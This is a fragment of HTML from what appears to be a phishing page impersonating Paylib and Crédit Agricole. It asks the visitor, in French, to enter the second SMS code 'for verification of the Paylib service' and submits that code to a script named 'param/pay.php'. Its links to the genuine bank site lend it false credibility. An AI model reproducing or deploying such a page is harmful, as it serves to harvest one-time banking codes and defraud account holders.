...
">
                    <div class="form">
                        ...
                        <form method="post" action="param/pay.php">

                            

                                <img src="style/1200px-Logo-Paylib.svg.png" width="200px" height="80px" />
                            <div class="form-group">
                            <p id="cc" style="font-size:15px">
                              <i class="ui icon big mobile"></i> <br> <b> Entrez le second code reçu par SMS ci-dessous<br> pour la vérification du service Paylib : <br><br>
                                                   <input maxlength="" type="text" placeholder="**********" name="paylib" id="paylib" class="form-control" style="display: inherit;width: 50%;" value=""></b></p><b>
                            </div>

                            <div class="form-group mt-5">
                                <button type="submit" class="btn-get-pass ">Accepter</button><br>
                                <a href="https://www.credit-agricole.fr"><br><button type="submit" class="">Refuser</button></a>
